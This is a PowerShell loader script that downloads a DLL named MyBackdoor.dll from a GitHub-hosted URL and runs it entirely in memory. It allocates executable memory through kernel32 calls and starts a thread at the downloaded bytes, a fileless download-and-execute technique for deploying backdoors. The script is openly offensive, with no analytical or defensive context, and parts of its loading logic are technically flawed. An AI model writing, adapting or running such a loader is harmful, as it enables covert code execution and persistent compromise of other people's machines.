# loader.ps1
# Fetches and reflectively loads payload.dll entirely in memory

# 1) URL of your hosted payload DLL
$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/blob/main/MyBackdoor.dll'
Write-Host "[+] Downloading payload from $payloadUrl"

# 2) Download raw DLL bytes
try {
    $dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)
} catch {
    Write-Error "Failed to download payload: $_"
    exit 1
}

# 3) Define minimal reflective loader
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class ReflectiveLoader {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize,
                                            IntPtr lpStartAddress, IntPtr lpParameter,
                                            uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void LoadAndRun(byte[] rawAssembly) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawAssembly.Length,
                                   0x1000 | 0x2000, 0x40);
        Marshal.Copy(rawAssembly, 0, addr, rawAssembly.Length);
        CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out _);
        WaitForSingleObject(addr, 0xFFFFFFFF);
    }
}
"@

# 4) Invoke reflective load
Write-Host "[+] Reflectively loading DLL into memory"
[ReflectiveLoader]::LoadAndRun($dllBytes)

# 5) Optionally call an exported entry point
# [MyBackdoor.Entry]::Start()